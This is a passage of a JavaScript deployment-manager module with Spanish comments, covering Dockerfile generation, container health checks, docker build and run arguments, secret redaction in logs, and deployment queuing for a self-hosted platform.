   * reutilicen la caché de paquetes sin bajar todo de red cada vez.
   */
  generateDockerfile(strategy) {
    const port = sanitizePort(strategy.containerPort, DEFAULTS.containerPort);
    const nodeTag = `node:${strategy.nodeMajor || '22'}-alpine`;
    const outputDir = /^[A-Za-z0-9._-]+$/.test(String(strategy.outputDir || '')) ? strategy.outputDir : 'dist';
    const cacheScope = safeSlug(strategy.projectSlug || 'default', 'app');
    const buildArgDecls = Array.isArray(strategy.buildArgNames)
      ? strategy.buildArgNames.filter(isValidEnvName).map((k) => `ARG ${k}`)
      : [];

    // Configuración de nginx para una SPA: cualquier ruta que no exista en
    // disco cae en index.html. Va con `printf` entre comillas simples para que
    // ni el shell del contenedor ni Docker toquen los `$uri`.
    const spaConf = "RUN printf 'server {\\n  listen 80;\\n  root /usr/share/nginx/html;\\n  index index.html;\\n  location / { try_files $uri $uri/ /index.html; }\\n}\\n' > /etc/nginx/conf.d/default.conf";

    if (strategy.stack === 'next') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${nodeTag} AS deps`,
        'WORKDIR /app',
        'COPY package*.json ./',
        'RUN --mount=type=cache,id=culkibo-npm,sharing=locked,target=/root/.npm npm ci --no-audit --no-fund || npm install --no-audit --no-fund',
        '',
        `FROM ${nodeTag} AS build`,
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        'ENV NEXT_TELEMETRY_DISABLED=1',
        `RUN --mount=type=cache,id=culkibo-next-${cacheScope},sharing=locked,target=/app/.next/cache npm run build`,
        '',
        `FROM ${nodeTag} AS runtime`,
        'WORKDIR /app',
        'ENV NODE_ENV=production',
        'ENV HOSTNAME=0.0.0.0',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app ./',
        'USER culkibo',
        `EXPOSE ${port}`,
        'CMD ["npm", "run", "start"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'vite') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${nodeTag} AS build`,
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY package*.json ./',
        'RUN --mount=type=cache,id=culkibo-npm,sharing=locked,target=/root/.npm npm ci --no-audit --no-fund || npm install --no-audit --no-fund',
        'COPY . .',
        `RUN --mount=type=cache,id=culkibo-vite-${cacheScope},sharing=locked,target=/app/node_modules/.vite npm run build`,
        '',
        'FROM nginx:1.27-alpine AS runtime',
        spaConf,
        `COPY --from=build /app/${outputDir} /usr/share/nginx/html`,
        'EXPOSE 80',
        'CMD ["nginx", "-g", "daemon off;"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'node') {
      const buildStep = strategy.buildScript ? 'RUN npm run build' : '# sin script de build';
      const startCmd = strategy.startCommand
        ? 'CMD ["npm", "run", "start"]'
        : 'CMD ["node", "."]';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${nodeTag} AS deps`,
        'WORKDIR /app',
        'COPY package*.json ./',
        'RUN --mount=type=cache,id=culkibo-npm,sharing=locked,target=/root/.npm npm ci --no-audit --no-fund || npm install --no-audit --no-fund',
        '',
        `FROM ${nodeTag} AS prod-deps`,
        'WORKDIR /app',
        'COPY package*.json ./',
        'RUN --mount=type=cache,id=culkibo-npm,sharing=locked,target=/root/.npm npm ci --omit=dev --no-audit --no-fund || npm install --omit=dev --no-audit --no-fund',
        '',
        `FROM ${nodeTag} AS build`,
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        buildStep,
        'RUN rm -rf /app/node_modules',
        '',
        `FROM ${nodeTag} AS runtime`,
        'WORKDIR /app',
        'ENV NODE_ENV=production',
        'ENV HOSTNAME=0.0.0.0',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app ./',
        'COPY --from=prod-deps --chown=culkibo:culkibo /app/node_modules ./node_modules',
        'USER culkibo',
        `EXPOSE ${port}`,
        startCmd,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'go') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM golang:1.23-alpine AS build',
        'WORKDIR /app',
        ...buildArgDecls,
        'COPY go.mod go.su[m] ./',
        'RUN --mount=type=cache,id=culkibo-gomod,sharing=locked,target=/go/pkg/mod go mod download',
        'COPY . .',
        `RUN --mount=type=cache,id=culkibo-gomod,sharing=locked,target=/go/pkg/mod --mount=type=cache,id=culkibo-gobuild-${cacheScope},sharing=locked,target=/root/.cache/go-build CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /app/server .`,
        '',
        'FROM alpine:3.21 AS runtime',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app/server /app/server',
        'USER culkibo',
        `ENV PORT=${port}`,
        `EXPOSE ${port}`,
        'CMD ["/app/server"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'python') {
      const entry = /^[A-Za-z0-9._-]+\.py$/.test(String(strategy.pythonEntry || '')) ? strategy.pythonEntry : 'main.py';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM python:3.12-slim AS runtime',
        'WORKDIR /app',
        'ENV PYTHONUNBUFFERED=1',
        'RUN useradd --create-home --shell /usr/sbin/nologin culkibo',
        'COPY requirements.tx[t] pyproject.tom[l] ./',
        'RUN --mount=type=cache,id=culkibo-pip,sharing=locked,target=/root/.cache/pip if [ -f requirements.txt ]; then pip install -r requirements.txt; elif [ -f pyproject.toml ]; then pip install .; fi',
        'COPY --chown=culkibo:culkibo . .',
        'USER culkibo',
        `EXPOSE ${port}`,
        `CMD ["python", "${entry}"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'static') {
      const root = outputDir === '.' ? '.' : outputDir;
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM nginx:1.27-alpine AS runtime',
        spaConf,
        `COPY ${root} /usr/share/nginx/html`,
        'EXPOSE 80',
        'CMD ["nginx", "-g", "daemon off;"]',
        ''
      ].join('\n');
    }

    return null;
  }

  /**
   * Orden de `--health-cmd` para las imágenes que generamos nosotros.
   *
   * Solo se inyecta en imágenes propias, donde sabemos qué binarios hay dentro.
   * En una imagen ajena un healthcheck que no puede ejecutarse la marcaría
   * `unhealthy` para siempre y estaríamos mintiendo sobre su estado.
   */
  healthCommandFor(strategy) {
    const port = sanitizePort(strategy.containerPort, DEFAULTS.containerPort);
    const p = sanitizeHealthPath(strategy.healthPath) || '/';
    const url = `http://127.0.0.1:${port}${p}`;
    if (strategy.stack === 'vite' || strategy.stack === 'static' || strategy.stack === 'go') {
      // Aceptar cualquier estado HTTP < 500 (igual que waitForHealth), incluso 401/404 en APIs Go
      return `wget --spider -S ${url} 2>&1 | awk '/HTTP\\//{c=$2} END{exit !(c>=100 && c<500)}'`;
    }
    if (strategy.stack === 'python') {
      // P1-31: capturar HTTPError para que APIs que devuelven 401/404 en '/' se consideren sanas (< 500)
      return `python -c "import urllib.request,urllib.error,sys\ntry:\n r=urllib.request.urlopen('${url}')\n sys.exit(0 if r.status<500 else 1)\nexcept urllib.error.HTTPError as e:\n sys.exit(0 if e.code<500 else 1)"`;
    }
    return `node -e "fetch('${url}').then(r=>process.exit(r.status<500?0:1)).catch(()=>process.exit(1))"`;
  }

  // -------------------------------------------------------------------------
  // 3. Construcción de argv
  // -------------------------------------------------------------------------

  /**
   * Argumentos de `docker build`.
   *
   * DETERMINISTA A PROPÓSITO: para la misma entrada devuelve exactamente el
   * mismo array. Ni marcas de tiempo, ni nonces, ni `--build-arg CACHEBUST`.
   * Ese es el fallo #7040 de Coolify y la prueba lo vigila.
   */
  /**
   * @param {{imageTag: string, contextDir: string, dockerfile?: string | null, buildArgNames?: string[], labels?: Record<string, any>}} spec
   * @returns {string[]}
   */
  buildArgs({ imageTag, contextDir, dockerfile = null, buildArgNames = [], labels = {} }) {
    const args = ['build', '--progress=plain', '-t', imageTag];

    if (dockerfile) {
      args.push('-f', path.join(contextDir, dockerfile));
    }

    // Solo NOMBRES. El valor lo toma docker del entorno del proceso hijo, así
    // que un secreto de build nunca aparece en `ps` ni en el log de build.
    for (const name of buildArgNames) {
      if (isValidEnvName(name)) args.push('--build-arg', name);
    }

    // Las etiquetas se escriben en la configuración de la imagen al final; no
    // invalidan la caché de capas (a diferencia de un ARG).
    for (const [key, value] of Object.entries(labels)) {
      if (/^[a-z0-9.\-_]+$/i.test(key)) args.push('--label', `${key}=${String(value).replace(/\s+/g, ' ').slice(0, 200)}`);
    }

    args.push(contextDir);
    return args;
  }

  /**
   * Argumentos de `railpack build` / `nixpacks build`.
   *
   * Los dos toman el directorio como argumento posicional y la etiqueta en
   * `--name`. Donde se separan es en los secretos:
   *
   *   - Nixpacks acepta `--env NOMBRE` a secas y, cita literal de su
   *     documentación, «si no hay signo igual el valor se toma del entorno
   *     actual». Esa es exactamente la forma que necesitamos: el nombre en
   *     argv, el valor en el entorno del hijo.
   *   - Railpack SOLO acepta `--env CLAVE=VALOR`. Pasar un secreto por ahí lo
   *     deja visible en `ps` para cualquier usuario de la máquina, así que a
   *     railpack no se le pasa ninguna variable. Un build que necesite secretos
   *     debe traer su propio Dockerfile.
   */
  /**
   * @param {string} builder
   * @param {{imageTag: string, contextDir: string, envNames?: string[]}} spec
   * @returns {string[]}
   */
  externalBuilderArgs(builder, { imageTag, contextDir, envNames = [] }) {
    if (builder === 'railpack') {
      return ['build', contextDir, '--name', imageTag, '--progress', 'plain'];
    }
    const args = ['build', contextDir, '--name', imageTag];
    for (const name of envNames) {
      if (isValidEnvName(name)) args.push('--env', name);
    }
    return args;
  }

  /**
   * Argumentos de `docker run`.
   *
   * Los valores de las variables de entorno NO están aquí: `-e CLAVE` sin `=`
   * hace que docker lea el valor del entorno del proceso que lo lanza. Es la
   * diferencia entre un secreto visible en `ps` para cualquier usuario de la
   * máquina y un secreto que solo ve el hijo.
   */
  /**
   * @param {{containerName: string, imageTag: string, hostPort: number, containerPort: number,
   *   envNames?: string[], envFile?: string | null, network?: string | null, memoryMb?: number, cpus?: string | number,
   *   pidsLimit?: number, healthCmd?: string | null, labels?: Record<string, any>}} spec
   * @returns {string[]}
   */
  runArgs({
    containerName,
    imageTag,
    hostPort,
    containerPort,
    envNames = [],
    envFile = null,
    network = DEFAULTS.network,
    memoryMb = DEFAULTS.memoryMb,
    cpus = DEFAULTS.cpus,
    pidsLimit = DEFAULTS.pidsLimit,
    healthCmd = null,
    labels = {}
  }) {
    const args = [
      'run', '-d',
      '--name', containerName,
      // Reinicio ante caída del proceso o del host. Sin esto no es un servicio
      // de producción, es un proceso que casualmente está vivo.
      '--restart', 'unless-stopped',
      // El contenedor solo debe ser alcanzable por el proxy y por la sonda de
      // salud del daemon; nunca directamente desde internet.
      '-p', `127.0.0.1:${hostPort}:${containerPort}`,
      '--memory', `${memoryMb}m`,
      // Igualar swap a memoria desactiva el swap del contenedor: preferimos un
      // OOM rápido y visible a una app que agoniza intercambiando páginas.
      '--memory-swap', `${memoryMb}m`,
      '--cpus', String(cpus),
      '--pids-limit', String(pidsLimit),
      '--security-opt', 'no-new-privileges',
      '--cap-drop', 'ALL',
      ...(Number(containerPort) < 1024 ? ['--cap-add', 'NET_BIND_SERVICE'] : []),
      // Sin esto el log JSON de un contenedor hablador llena el disco del VPS.
      '--log-opt', 'max-size=10m',
      '--log-opt', 'max-file=3'
    ];

    if (network) args.push('--network', network);

    if (envFile) {
      args.push('--env-file', envFile);
    } else {
      for (const name of envNames) {
        if (isValidEnvName(name)) args.push('-e', name);
      }
    }

    if (healthCmd) {
      args.push('--health-cmd', healthCmd, '--health-interval', '10s', '--health-timeout', '3s', '--health-retries', '3', '--health-start-period', '10s');
    }

    for (const [key, value] of Object.entries(labels)) {
      if (/^[a-z0-9.\-_]+$/i.test(key)) args.push('--label', `${key}=${String(value).slice(0, 200)}`);
    }

    args.push(imageTag);
    return args;
  }

  // -------------------------------------------------------------------------
  // Utilidades de red y puertos
  // -------------------------------------------------------------------------

  /** Crea la red de Culkibo si no existe. Idempotente y cacheada 60 s. */
  async ensureNetwork(name = DEFAULTS.network) {
    const now = Date.now();
    const cachedAt = this._networkCache.get(name);
    if (cachedAt && (now - cachedAt) < 60000) return true;
    const inspect = await this.runDocker(['network', 'inspect', name], { timeoutMs: 8000 });
    if (inspect.code === 0) {
      this._networkCache.set(name, now);
      return true;
    }
    const created = await this.runDocker(['network', 'create', name], { timeoutMs: 10000 });
    if (created.code === 0) {
      this._networkCache.set(name, now);
      return true;
    }
    return false;
  }

  /**
   * ¿Con qué dirección debe hablar Caddy al contenedor?
   *
   * Si Caddy corre en un contenedor, `127.0.0.1` del host NO es su loopback:
   * marcarlo así produce una ruta que apunta a la nada. Lo correcto es
   * adjuntarlo a la red de Culkibo y marcar el nombre del contenedor. Si Caddy
   * corre nativo en el host, `127.0.0.1:<puertoHost>` sí es correcto.
   */
  async resolveUpstream({ containerName, containerPort, hostPort, network = DEFAULTS.network }) {
    const caddyName = DEFAULTS.caddyContainerName;
    const inspect = await this.runDocker(
      ['inspect', '-f', '{{json .NetworkSettings.Networks}}', caddyName],
      { timeoutMs: 8000 }
    );

    if (inspect.code !== 0) {
      // Caddy no es un contenedor de esta máquina: es nativo o remoto.
      return { dial: `127.0.0.1:${hostPort}`, mode: 'host' };
    }

    let networks = {};
    try { networks = JSON.parse((inspect.stdout || '{}').trim()) || {}; } catch (e) {}
    if (!networks[network]) {
      const connected = await this.runDocker(['network', 'connect', network, caddyName], { timeoutMs: 10000 });
      if (connected.code !== 0) {
        // No se pudo adjuntar: caemos al host, que al menos funciona si Caddy
        // publica puertos con acceso al gateway.
        return { dial: `127.0.0.1:${hostPort}`, mode: 'host', warning: connected.stderr.trim() };
      }
    }
    return { dial: `${containerName}:${containerPort}`, mode: 'network' };
  }

  /** Puerto libre coordinado con portRegistry (rango 20000–24999, sin solape con catálogo ni puertos efímeros). */
  async findFreePort(start = 20000, owner = `deploy_${Date.now()}`) {
    const port = await portRegistry.allocate({
      kind: 'deploy',
      owner,
      start,
      end: Math.max(start + 4999, 24999),
      extraExcluded: this._pendingPorts
    });
    this._pendingPorts.add(port);
    return port;
  }

  /**
   * Resuelve bases de datos gestionadas vinculadas o pertenecientes al proyecto:
   * devuelve sus redes aisladas (`culkibo_net_<id>`) y variables de entorno
   * descifradas en memoria (jamás se guardan contraseñas en projects.json).
   */
  resolveLinkedDatabases(project) {
    /** @type {Set<string>} */
    const networks = new Set();
    /** @type {Record<string, string>} */
    const injectedEnv = {};
    /** @type {string[]} */
    const secretValues = [];
    /** @type {string[]} */
    const linkedNames = [];

    const dbm = getDatabaseManager();
    if (!dbm || typeof dbm.list !== 'function') {
      return { networks: [], injectedEnv, secretValues, linkedNames };
    }

    const explicitIds = new Set(Array.isArray(project.linkedDatabaseIds) ? project.linkedDatabaseIds : []);
    const allDbs = dbm.list();
    const matched = allDbs.filter((d) => d && (d.projectId === project.id || explicitIds.has(d.id)));

    for (const db of matched) {
      if (db.networkName) networks.add(db.networkName);
      linkedNames.push(`${db.name} (${db.engine})`);
      try {
        const creds = dbm.getCredentials(db.id);
        const connStr = creds && (creds.internalConnectionString || creds.connectionString)
          ? String(creds.internalConnectionString || creds.connectionString)
          : null;
        if (connStr) {
          secretValues.push(connStr);
          if (creds.password) secretValues.push(String(creds.password));
          const eng = String(db.engine || '').toLowerCase();
          if (eng === 'redis' || eng === 'valkey') {
            if (!injectedEnv.REDIS_URL) injectedEnv.REDIS_URL = connStr;
          } else if (eng === 'mongodb') {
            if (!injectedEnv.MONGODB_URI) injectedEnv.MONGODB_URI = connStr;
            if (!injectedEnv.DATABASE_URL) injectedEnv.DATABASE_URL = connStr;
          } else {
            if (!injectedEnv.DATABASE_URL) injectedEnv.DATABASE_URL = connStr;
          }
        }
      } catch (e) {}
    }

    return { networks: Array.from(networks), injectedEnv, secretValues, linkedNames };
  }

  // -------------------------------------------------------------------------
  // Registro y notificación
  // -------------------------------------------------------------------------

  /**
   * Elimina de un texto cualquier valor que coincida con un secreto conocido.
   *
   * La salida de un build o de un contenedor puede volcar el entorno (un
   * `console.log(process.env)`, un stack trace de una librería de config). Si
   * eso llega al log en vivo del panel, el secreto se filtra a cualquiera que
   * mire la pantalla.
   */
  redact(text, secrets = []) {
    let out = String(text == null ? '' : text);
    for (const secret of secrets) {
      if (typeof secret === 'string' && secret.length >= 8) {
        out = out.split(secret).join('***');
      }
    }
    return out;
  }

  log(deployment, level, message) {
    const safe = this.redact(message, deployment.__secrets || []).slice(0, 4000);
    const entry = { at: new Date().toISOString(), level, message: safe };
    deployment.logLines.push(entry);
    // Se conservan las últimas 800 líneas: suficiente para diagnosticar un
    // build fallido sin que un `npm ci` verboso reviente la memoria.
    if (deployment.logLines.length > 800) deployment.logLines.shift();

    if (containerOrchestrator) {
      containerOrchestrator.addLog(level, 'citadel', safe, new Date(), deployment.projectId);
    }
    this.emit('deploy_log', { deploymentId: deployment.id, projectId: deployment.projectId, ...entry });
  }

  setStatus(deployment, status, extra = {}) {
    deployment.status = status;
    Object.assign(deployment, extra);
    this.emit('deploy_event', {
      deploymentId: deployment.id,
      projectId: deployment.projectId,
      status,
      kind: deployment.kind || 'deploy',
      imageTag: deployment.imageTag,
      upstream: deployment.upstream,
      hostnames: deployment.hostnames,
      commit: (deployment.git && deployment.git.shortCommit) || null,
      startedAt: deployment.startedAt || null,
      finishedAt: deployment.finishedAt || null,
      durationMs: deployment.durationMs || null,
      error: deployment.error || null
    });
  }

  notify(payload) {
    if (!notificationService) return;
    Promise.resolve(notificationService.notify(payload)).catch(() => {});
  }

  // -------------------------------------------------------------------------
  // 4. Sonda de salud
  // -------------------------------------------------------------------------

  /**
   * Espera a que el destino nuevo responda antes de mandarle tráfico.
   *
   * Éste es el punto en el que un despliegue deja de ser «arranco y cruzo los
   * dedos». Dos condiciones de parada, no una:
   *
   *   a) el sondeo HTTP devuelve algo por debajo de 500 — el proceso escucha y
   *      enruta (un 404 en `/` es una app viva; un 502 no lo es);
   *   b) el contenedor deja de estar en ejecución — un crash-loop se detecta en
   *      el primer ciclo en vez de consumir los 30 s completos.
   */
  /**
   * @param {{ hostPort?: number | null, containerPort?: number | null, healthPath: string, containerName?: string | null, timeoutMs: number, intervalMs: number, onProgress?: ((msg: string) => void) | null, signal?: AbortSignal | null }} spec
   */
  async waitForHealth({ hostPort, containerPort = null, healthPath, containerName, timeoutMs, intervalMs, onProgress = null, signal = null }) {
    const deadline = Date.now() + timeoutMs;
    const isContainerized = process.env.CULKIBO_CADDY_CONTAINERIZED === '1' || fs.existsSync('/.dockerenv');
    const probeUrls = [];
    if (isContainerized && containerName && containerPort) {
      probeUrls.push(`http://${containerName}:${containerPort}${healthPath}`);
    }
    if (hostPort) {
      probeUrls.push(`http://127.0.0.1:${hostPort}${healthPath}`);
    }
    if (probeUrls.length === 0) {
      return { healthy: false, attempts: 0, reason: 'No hay puerto ni contenedor configurado para sondeo de salud' };
    }
    let attempts = 0;
    let lastError = 'sin respuesta';
    const backoff = [100, 150, 250, 500];

    while (Date.now() < deadline) {
      if (signal && signal.aborted) {
        return { healthy: false, attempts, reason: 'Verificación de salud cancelada', aborted: true };
      }
      attempts++;

      // Sondeo HTTP primero: si el servicio ya está listo ahorra un `docker inspect` por intento.
      for (const url of probeUrls) {
        try {
          const reqTimeout = AbortSignal.timeout(Math.min(5000, Math.max(1000, intervalMs * 4)));
          const combinedSignal = (signal && typeof AbortSignal.any === 'function')
            ? AbortSignal.any([signal, reqTimeout])
            : reqTimeout;
          const res = await fetch(url, { redirect: 'manual', signal: combinedSignal });
          if (res.status < 500) {
            return { healthy: true, attempts, status: res.status };
          }
          lastError = `respondió ${res.status}`;
        } catch (err) {
          if (signal && signal.aborted) {
            return { healthy: false, attempts, reason: 'Verificación de salud cancelada', aborted: true };
          }
          lastError = err.name === 'TimeoutError' ? 'tiempo de espera agotado' : 'conexión rechazada';
        }
      }

      // Solo comprobar si el contenedor murió cuando el HTTP aún no responde.
      if (containerName) {
        const state = await this.runDocker(['inspect', '-f', '{{.State.Running}}', containerName], { timeoutMs: 5000, signal });
        if (state.aborted) {
          return { healthy: false, attempts, reason: 'Verificación de salud cancelada', aborted: true };
        }
        if (state.code === 0 && (state.stdout || '').trim() === 'false') {
          return { healthy: false, attempts, reason: 'El contenedor se detuvo durante el arranque (revisa los logs de la build)' };
        }
      }

      if (onProgress && attempts % 5 === 0) {
        onProgress(`Esperando a que el servicio responda en ${healthPath} (intento ${attempts}: ${lastError})`);
      }
      const waitMs = attempts <= backoff.length ? Math.min(intervalMs, backoff[attempts - 1]) : intervalMs;
      await new Promise((r) => {
        const t = setTimeout(r, waitMs);
        if (signal) {
          const onAb = () => { clearTimeout(t); r(undefined); };
          signal.addEventListener('abort', onAb, { once: true });
        }
      });
    }

    return { healthy: false, attempts, reason: `No respondió en ${Math.round(timeoutMs / 1000)} s (${lastError})` };
  }

  // -------------------------------------------------------------------------
  // 5. Despliegue
  // -------------------------------------------------------------------------

  /** Hostnames públicos del proyecto, en el orden en que deben registrarse. */
  hostnamesFor(project) {
    const raw = Array.isArray(project.domains) ? project.domains : [];
    const clean = raw
      .map(d => String(typeof d === 'string' ? d : (d && d.hostname) || '').trim().toLowerCase())
      .filter(d => /^(\*\.)?([a-z0-9]([a-z0-9-]*[a-z0-9])?\.)+[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(d));
    return Array.from(new Set(clean));
  }

  /** Serializa despliegues del mismo proyecto: dos a la vez es corrupción segura. */
  async deploy(project, options = {}) {
    if (!project || !project.id) throw new Error('Proyecto inválido');
    const inFlight = this.locks.get(project.id);
    if (inFlight) {
      throw new Error('Ya hay un despliegue en curso para este proyecto');
    }
    const task = this._deploy(project, options).finally(() => {
      if (this.locks.get(project.id) === task) this.locks.delete(project.id);
      this.drainPending(project.id);
    });
    this.locks.set(project.id, task);
    return task;
  }

  /**
   * Como `deploy()`, pero si ya hay uno en curso lo deja encolado en vez de
   * fallar.
   *
   * Existe por el webhook: durante un build de varios minutos es normal que
   * lleguen más pushes, y rechazarlos deja la rama desplegada por detrás del
   * repositorio sin que nadie se entere. Rechazar es correcto para un botón
   * («ya hay uno en curso», el usuario lo ve); para un disparo automático no lo
   * es.
   *
   * @returns {{started: boolean, queued: boolean, promise?: Promise<any>}}
   */
  enqueue(project, options = {}) {
    if (!project || !project.id) throw new Error('Proyecto inválido');
    if (this.locks.has(project.id)) {
      this.pending.set(project.id, { project, options });
      return { started: false, queued: true };
    }
    const promise = this.deploy(project, options);
    promise.catch(() => {});
    return { started: true, queued: false, promise };
  }

  /** Lanza el despliegue que quedó en espera, leyendo el Project más reciente de disco/memoria. */
  drainPending(projectId) {
    const next = this.pending.get(projectId);
    if (!next) return;
    this.pending.delete(projectId);
    if (this.locks.has(projectId)) return; // otro se adelantó; el suyo drenará
    let latestProject = next.project;
    try {
      const pm = getProjectManager();
      const fresh = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
      if (fresh) latestProject = fresh;
    } catch (e) {}
    const promise = this.deploy(latestProject, next.options);
    promise.catch(() => {});
  }

  async _deploy(project, options = {}) {
    this._abortedProjects.delete(project.id);
    const opts = { ...DEFAULTS, ...options };
    const state = this.getState(project.id);
    const slug = safeSlug(project.id);
    const version = options.version
      ? safeSlug(options.version, 'v')
      : `b${Date.now().toString(36)}`;

    const linkedDb = this.resolveLinkedDatabases(project);
    // Las variables explícitas del proyecto prevalecen sobre las autoinyectadas de BDs vinculadas.
    const envVars = { ...linkedDb.injectedEnv, ...(project.envVars || {}) };
    const envNames = Object.keys(envVars).filter(isValidEnvName);
    const rejectedEnv = Object.keys(envVars).filter(k => !isValidEnvName(k));

    const suffix = crypto.randomBytes(3).toString('hex');
    const preassignedId = options.deploymentId || `dep_${Date.now()}_${suffix}`;
    /** @type {any} */
    const deployment = {
      id: preassignedId,
      projectId: project.id,
      projectName: project.name || project.id,
      status: 'pendiente',
      imageTag: `culkibo/${slug}:${version}`,
      // Sufijo aleatorio: evita colisiones si el usuario redespliega la misma `version`
      // y garantiza que `forceRemove` jamás pueda tocar el contenedor activo.
      containerName: `culkibo_${slug}_${version}_${suffix}`,
      hostPort: null,
      containerPort: null,
      upstream: null,
      hostnames: this.hostnamesFor(project),
      routeSwitched: false,
      strategy: null,
      /** Qué código es esto exactamente. Lo rellena la sincronización con git. */
      git: null,
      trigger: options.trigger || 'manual',
      previous: state.current ? { ...state.current } : null,
      startedAt: new Date().toISOString(),
      finishedAt: null,
      durationMs: null,
      error: null,
      logLines: []
    };
    // No se persiste: solo sirve para redactar la salida en vivo (envVars + buildArgs + BDs vinculadas).
    const allSecretValues = [
      ...Object.values(envVars),
      ...Object.values(project.buildArgs || {}),
      ...linkedDb.secretValues
    ];
    Object.defineProperty(deployment, '__secrets', { value: allSecretValues, enumerable: false });

    const opController = new AbortController();
    const activeOp = {
      deploymentId: deployment.id,
      stage: 'pendiente',
      controller: opController,
      children: new Set(),
      containerName: deployment.containerName
    };
    this._activeOps.set(project.id, activeOp);

    const setStage = (stage) => {
      activeOp.stage = stage;
      this.setStatus(deployment, stage);
    };

    state.history.unshift(deployment);
    if (state.history.length > 20) state.history.pop();

    const started = Date.now();
    /** @param {string} status @param {string | null} [error] */
    const finish = (status, error = null) => {
      deployment.finishedAt = new Date().toISOString();
      deployment.durationMs = Date.now() - started;
      deployment.error = error;
      setStage(status);
      this.saveStore();
      if (status === 'fallido' && !deployment.__failNotified) {
        deployment.__failNotified = true;
        this.notify({
          event: 'deploy_failed',
          level: 'error',
          title: 'Despliegue fallido',
          message: `${deployment.projectName}: ${String(error || 'error desconocido').slice(0, 600)}`,
          projectId: project.id,
          projectName: deployment.projectName
        });
      }
      return deployment;
    };

    // Validar hooks pre/post despliegue antes de empezar (fail-fast sin desperdiciar build)
    /** @type {string[] | null} */
    let preHookArgv = null;
    /** @type {string[] | null} */
    let postHookArgv = null;
    if (!options.skipHooks) {
      try {
        if (project.preDeployCommand && String(project.preDeployCommand).trim()) {
          preHookArgv = parseSafeCommandArgv(project.preDeployCommand);
        }
        if (project.postDeployCommand && String(project.postDeployCommand).trim()) {
          postHookArgv = parseSafeCommandArgv(project.postDeployCommand);
        }
      } catch (hookErr) {
        this.log(deployment, 'ERROR', `Hook pre/post despliegue inválido: ${hookErr.message}`);
        this._activeOps.delete(project.id);
        return finish('fallido', `Hook inválido: ${hookErr.message}`);
      }
    }

    this.notify({
      event: 'deploy_started',
      level: 'info',
      title: 'Despliegue iniciado',
      message: `${deployment.projectName}: iniciando despliegue (${deployment.trigger}).`,
      projectId: project.id,
      projectName: deployment.projectName
    });

    try {
      // --- 0. Requisitos --------------------------------------------------
      const docker = await this.detectDocker({ force: true });
      if (!docker.available) {
        this.log(deployment, 'ERROR', `No se puede desplegar: ${docker.reason}.`);
        return finish('fallido', docker.reason);
      }

      // Guardia anti-ENOSPC antes de iniciar el build (configurable vía CULKIBO_MIN_FREE_DISK_MB)
      if (!options.skipDiskCheck && process.env.NODE_ENV !== 'test' && typeof fs.statfsSync === 'function') {
        try {
          const minFreeMb = Math.max(0, Number(process.env.CULKIBO_MIN_FREE_DISK_MB ?? 1024));
          if (minFreeMb > 0) {
            const st = fs.statfsSync(DATA_DIR);
            const freeMb = Math.round((st.bavail * st.bsize) / (1024 * 1024));
            if (freeMb < minFreeMb) {
              const msg = `Espacio en disco insuficiente (${freeMb} MB libres; mínimo requerido ${minFreeMb} MB). Limpia la caché de BuildKit desde Ajustes → Doctor antes de desplegar.`;
              this.log(deployment, 'ERROR', msg);
              return finish('fallido', msg);
            }
          }
        } catch (e) {}
      }

      const rootContextDir = options.contextDir
        || (project.localPath && fs.existsSync(project.localPath) ? project.localPath : path.join(ROOT_BASE_DIR, 'projects', project.id));
      let contextDir = rootContextDir;
      if (!options.contextDir && project.baseDirectory && project.baseDirectory !== '/' && project.baseDirectory !== '.') {
        try {
          contextDir = assertContainedPath(rootContextDir, String(project.baseDirectory).replace(/^\/+/, ''));
        } catch (e) {
          this.log(deployment, 'WARN', `baseDirectory inválido ignorado (${project.baseDirectory}): ${e.message}`);
        }
      }

      // --- 0.5. Código fuente ---------------------------------------------
      if (!options.contextDir && options.gitSync !== false && !project.localPath) {
        setStage('sincronizando');
        // Si localRunner está clonando este proyecto en paralelo tras POST /projects, esperar a que termine
        try {
          const localRunner = require('./localRunner');
          const pendingClone = localRunner && localRunner.cloningLocks && localRunner.cloningLocks.get(project.id);
          if (pendingClone) {
            this.log(deployment, 'INFO', 'Esperando a que finalice la clonación inicial en curso...');
            await pendingClone.catch(() => {});
          }
        } catch (e) {}

        const sync = await repoSync.sync(project, {
          commit: options.commit || null,
          onLine: (line) => this.log(deployment, 'INFO', line)
        });

        if (opController.signal.aborted || this._abortedProjects.has(project.id)) {
          this.log(deployment, 'WARN', 'Despliegue cancelado durante la sincronización Git');
          return finish('cancelado', 'Despliegue cancelado');
        }
        if (!sync.ok) {
          this.log(deployment, 'ERROR', `No se pudo obtener el código: ${sync.error}`);
          return finish('fallido', sync.error);
        }

        deployment.git = {
